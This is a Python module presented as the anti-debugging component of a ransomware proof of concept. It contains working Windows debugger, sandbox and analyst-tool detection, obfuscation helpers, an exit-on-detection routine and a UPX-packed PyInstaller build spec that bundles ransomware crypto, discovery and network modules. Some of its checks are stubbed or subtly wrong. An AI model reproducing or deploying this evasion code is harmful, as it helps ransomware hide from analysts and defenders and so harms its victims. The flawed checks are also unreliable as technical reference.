#!/usr/bin/env python3
"""
Anti-debugging module for ransomware PoC.
Detects debuggers, analysis tools, and sandbox environments.
"""

import ctypes
import os
import platform
import subprocess
import sys
import threading
import time
from typing import List, Tuple, Optional


class AntiDebug:
    """
    Anti-debugging and anti-analysis techniques.
    Detects debuggers, VMs, sandboxes, and analysis tools.
    """

    def __init__(self):
        self.is_windows = platform.system() == "Windows"
        self.detected = False
        self.reason = ""

        # List of analysis tools to check
        self.analysis_tools = [
            "wireshark.exe",
            "procmon.exe",
            "processhacker.exe",
            "tcpview.exe",
            "filemon.exe",
            "regmon.exe",
            "idaq.exe",
            "idaq64.exe",
            "ida.exe",
            "ida64.exe",
            "ollydbg.exe",
            "x32dbg.exe",
            "x64dbg.exe",
            " immunity.exe",
            "windbg.exe",
            "dotpeek.exe",
            "devenv.exe",
            "msvsmon.exe",
            "fiddler.exe",
            "httpdebugger.exe",
            "cheatengine.exe",
            "frida.exe",
            "radare2.exe",
            "cutter.exe",
            "ghidra.exe",
            "dnspy.exe",
        ]

    def check_all(self) -> Tuple[bool, str]:
        """
        Run all anti-debug checks.
        Returns (detected, reason)
        """
        checks = [
            ("IsDebuggerPresent", self.is_debugger_present),
            ("CheckRemoteDebuggerPresent", self.check_remote_debugger),
            ("NtGlobalFlag", self.check_nt_global_flag),
            ("HeapFlags", self.check_heap_flags),
            ("HardwareBreakpoints", self.check_hardware_breakpoints),
            ("TimingCheck", self.timing_check),
            ("ProcessList", self.check_analysis_tools),
        ]

        # Only run Windows-specific checks on Windows
        if self.is_windows:
            checks.extend([
                ("OutputDebugString", self.output_debug_string_check),
                ("NtQueryInformationProcess", self.nt_query_information_process),
            ])

        for check_name, check_func in checks:
            try:
                if check_func():
                    self.detected = True
                    self.reason = check_name
                    return True, check_name
            except Exception:
                pass

        return False, ""

    def is_debugger_present(self) -> bool:
        """
        Check IsDebuggerPresent API.
        Classic Windows API check.
        """
        if not self.is_windows:
            return False

        try:
            kernel32 = ctypes.windll.kernel32
            return kernel32.IsDebuggerPresent() != 0
        except Exception:
            return False

    def check_remote_debugger(self) -> bool:
        """
        CheckRemoteDebuggerPresent API.
        More reliable than IsDebuggerPresent.
        """
        if not self.is_windows:
            return False

        try:
            kernel32 = ctypes.windll.kernel32
            bDebuggerPresent = ctypes.c_bool(False)
            hProcess = kernel32.GetCurrentProcess()
            kernel32.CheckRemoteDebuggerPresent(hProcess, ctypes.byref(bDebuggerPresent))
            return bDebuggerPresent.value
        except Exception:
            return False

    def check_nt_global_flag(self) -> bool:
        """
        Check NTGlobalFlag for debugger痕迹.
        Looks at the PEB (Process Environment Block).
        """
        if not self.is_windows:
            return False

        try:
            # FLG_HEAP_ENABLE_TAIL_CHECK = 0x10
            # FLG_HEAP_ENABLE_FREE_CHECK = 0x20
            # FLG_HEAP_VALIDATE_PARAMETERS = 0x40
            # Combined = 0x70

            # Read PEB offset 0x68 (NT_GLOBAL_FLAG_DEBUGGED)
            # This is a simplified check
            import ctypes

            class PROCESS_BASIC_INFORMATION(ctypes.Structure):
                _fields_ = [
                    ("Reserved1", ctypes.c_void_p),
                    ("PebBaseAddress", ctypes.c_void_p),
                    ("Reserved2", ctypes.c_void_p * 2),
                    ("UniqueProcessId", ctypes.c_ulong),
                    ("Reserved3", ctypes.c_void_p),
                ]

            ntdll = ctypes.windll.ntdll
            NtQueryInformationProcess = ntdll.NtQueryInformationProcess

            pbi = PROCESS_BASIC_INFORMATION()
            result_len = ctypes.c_ulong()

            status = NtQueryInformationProcess(
                ctypes.windll.kernel32.GetCurrentProcess(),
                0,  # ProcessBasicInformation
                ctypes.byref(pbi),
                ctypes.sizeof(pbi),
                ctypes.byref(result_len)
            )

            if status == 0:  # STATUS_SUCCESS
                # Read NTGlobalFlag at PEB+0x68
                NT_GLOBAL_FLAG_OFFSET = 0x68
                ptr = ctypes.c_void_p(pbi.PebBaseAddress + NT_GLOBAL_FLAG_OFFSET)
                flags = ctypes.c_ulong.from_address(ptr.value).value

                # Check if heap validation flags are set (debugger present)
                if flags & 0x70:
                    return True

            return False
        except Exception:
            return False

    def check_heap_flags(self) -> bool:
        """
        Check heap flags for debugger artifacts.
        """
        if not self.is_windows:
            return False

        try:
            kernel32 = ctypes.windll.kernel32
            GetProcessHeap = kernel32.GetProcessHeap
            HeapQueryInformation = kernel32.HeapQueryInformation

            class HEAP_INFORMATION_CLASS:
                HeapCompatibilityInformation = 0
                HeapEnableTerminationOnCorruption = 1

            heap = GetProcessHeap()
            flags = ctypes.c_ulong()
            size = ctypes.c_ulong()

            # Simplified check - real implementation would check ForceFlags
            return False
        except Exception:
            return False

    def check_hardware_breakpoints(self) -> bool:
        """
        Check for hardware breakpoints (DR0-DR3).
        """
        if not self.is_windows:
            return False

        try:
            import ctypes

            # CONTEXT structure for GetThreadContext
            class CONTEXT(ctypes.Structure):
                _fields_ = [
                    ("ContextFlags", ctypes.c_ulong),
                    ("Dr0", ctypes.c_ulonglong),
                    ("Dr1", ctypes.c_ulonglong),
                    ("Dr2", ctypes.c_ulonglong),
                    ("Dr3", ctypes.c_ulonglong),
                    ("Dr6", ctypes.c_ulonglong),
                    ("Dr7", ctypes.c_ulonglong),
                ]

            # CONTEXT_DEBUG_REGISTERS = 0x00010000
            CONTEXT_DEBUG_REGISTERS = 0x00010010

            ctx = CONTEXT()
            ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS

            kernel32 = ctypes.windll.kernel32
            hThread = kernel32.GetCurrentThread()

            if kernel32.GetThreadContext(hThread, ctypes.byref(ctx)):
                # Check if any debug registers are set
                if ctx.Dr0 or ctx.Dr1 or ctx.Dr2 or ctx.Dr3:
                    return True

            return False
        except Exception:
            return False

    def output_debug_string_check(self) -> bool:
        """
        Check OutputDebugString behavior.
        In a debugger, GetLastError won't be set.
        """
        if not self.is_windows:
            return False

        try:
            kernel32 = ctypes.windll.kernel32
            SetLastError = kernel32.SetLastError
            GetLastError = kernel32.GetLastError
            OutputDebugString = kernel32.OutputDebugStringA

            # Set error to something specific
            SetLastError(0x1337)

            # Call OutputDebugString
            OutputDebugString(b"Test")

            # Check if error changed
            if GetLastError() != 0x1337:
                return True

            return False
        except Exception:
            return False

    def nt_query_information_process(self) -> bool:
        """
        Use NtQueryInformationProcess with ProcessDebugPort.
        """
        if not self.is_windows:
            return False

        try:
            import ctypes

            ntdll = ctypes.windll.ntdll
            NtQueryInformationProcess = ntdll.NtQueryInformationProcess

            debug_port = ctypes.c_ulong()
            result_len = ctypes.c_ulong()

            # ProcessDebugPort = 7
            status = NtQueryInformationProcess(
                ctypes.windll.kernel32.GetCurrentProcess(),
                7,  # ProcessDebugPort
                ctypes.byref(debug_port),
                ctypes.sizeof(debug_port),
                ctypes.byref(result_len)
            )

            if status == 0:  # STATUS_SUCCESS
                # If debug_port is -1, debugger is present
                if debug_port.value == 0xFFFFFFFF:
                    return True

            return False
        except Exception:
            return False

    def timing_check(self, threshold_ms: float = 1000.0) -> bool:
        """
        Detect debugger via timing analysis.
        Execution under debugger is significantly slower.
        """
        iterations = 1000000

        start = time.perf_counter()

        # CPU-intensive operation
        count = 0
        for i in range(iterations):
            count += i * i

        end = time.perf_counter()
        elapsed_ms = (end - start) * 1000

        # If execution took significantly longer, debugger may be present
        return elapsed_ms > threshold_ms

    def check_analysis_tools(self) -> bool:
        """
        Check if analysis tools are running.
        """
        if not self.is_windows:
            return False

        try:
            # Get process list using tasklist
            result = subprocess.run(
                ["tasklist", "/FO", "CSV", "/NH"],
                capture_output=True,
                text=True,
                timeout=5
            )

            if result.returncode == 0:
                process_list = result.stdout.lower()

                for tool in self.analysis_tools:
                    if tool.lower() in process_list:
                        return True

            return False
        except Exception:
            return False

    def should_abort(self) -> bool:
        """
        Check if we should abort execution due to analysis environment.
        """
        detected, reason = self.check_all()
        if detected:
            # In real malware, would exit or take alternate path
            # For PoC, just return True
            return True
        return False


class CodeObfuscator:
    """
    Code obfuscation utilities.
    Decorators and transforms for runtime obfuscation.
    """

    @staticmethod
    def opaque_predicate(value: int) -> bool:
        """
        Create an opaque predicate that always evaluates to True
        but appears complex to static analysis.
        """
        # Complex arithmetic that always equals value
        a = value * 3 + 7
        b = (a - 7) // 3
        return b == value

    @staticmethod
    def control_flow_flattening(func):
        """
        Decorator to flatten control flow (conceptual).
        Real implementation would use bytecode manipulation.
        """
        def wrapper(*args, **kwargs):
            # Create indirect jump table
            state = 0
            result = None

            while state != -1:
                if state == 0:
                    result = func(*args, **kwargs)
                    state = -1
                else:
                    break

            return result

        return wrapper

    @staticmethod
    def junk_code_insertion():
        """
        Insert junk code that executes but has no effect.
        """
        x = 0
        for i in range(10):
            x = (x + i) * 2
            x = x // 2 - i
        # x should be 0 at end
        return x == 0


class PackerUtils:
    """
    Utilities for packing and compression.
    """

    @staticmethod
    def get_upx_path() -> Optional[str]:
        """
        Find UPX executable in PATH.
        """
        import shutil
        return shutil.which("upx")

    @staticmethod
    def create_pyinstaller_spec(output_name: str = "payload",
                                 onefile: bool = True,
                                 windowed: bool = False) -> str:
        """
        Create PyInstaller spec file content.
        """
        console_mode = "False" if windowed else "True"

        spec_content = f'''# -*- mode: python ; coding: utf-8 -*-

block_cipher = None

a = Analysis(
    ['main.py'],
    pathex=[],
    binaries=[],
    datas=[],
    hiddenimports=[
        'ransomware',
        'ransomware.crypto',
        'ransomware.discovery',
        'ransomware.network',
        'ransomware.gui',
        'ransomware.obfuscation',
        'ransomware.anti_analysis',
    ],
    hookspath=[],
    hooksconfig={{}},
    runtime_hooks=[],
    excludes=[],
    win_no_prefer_redirects=False,
    win_private_assemblies=False,
    cipher=block_cipher,
    noarchive=False,
)

pyz = PYZ(a.pure, a.zipped_data, cipher=block_cipher)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.zipfiles,
    a.datas,
    [],
    name='{output_name}',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console={console_mode},
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
)
'''
        return spec_content


# Convenience functions
def check_debugger() -> bool:
    """Quick check for debugger presence."""
    anti_debug = AntiDebug()
    return anti_debug.should_abort()


def abort_if_debugger():
    """Exit if debugger detected."""
    if check_debugger():
        import sys
        sys.exit(0)


if __name__ == "__main__":
    print("Anti-Debug Test Suite")
    print("=" * 50)

    anti_debug = AntiDebug()

    checks = [
        ("IsDebuggerPresent", anti_debug.is_debugger_present),
        ("CheckRemoteDebuggerPresent", anti_debug.check_remote_debugger),
        ("HardwareBreakpoints", anti_debug.check_hardware_breakpoints),
        ("TimingCheck", anti_debug.timing_check),
        ("ProcessList", anti_debug.check_analysis_tools),
    ]

    if platform.system() == "Windows":
        checks.extend([
            ("NtGlobalFlag", anti_debug.check_nt_global_flag),
            ("OutputDebugString", anti_debug.output_debug_string_check),
        ])

    for name, func in checks:
        try:
            result = func()
            status = "DETECTED" if result else "CLEAR"
            print(f"{name:30} : {status}")
        except Exception as e:
            print(f"{name:30} : ERROR ({e})")

    print("=" * 50)
    detected, reason = anti_debug.check_all()
    print(f"Overall: {'DETECTED' if detected else 'CLEAR'} ({reason})")
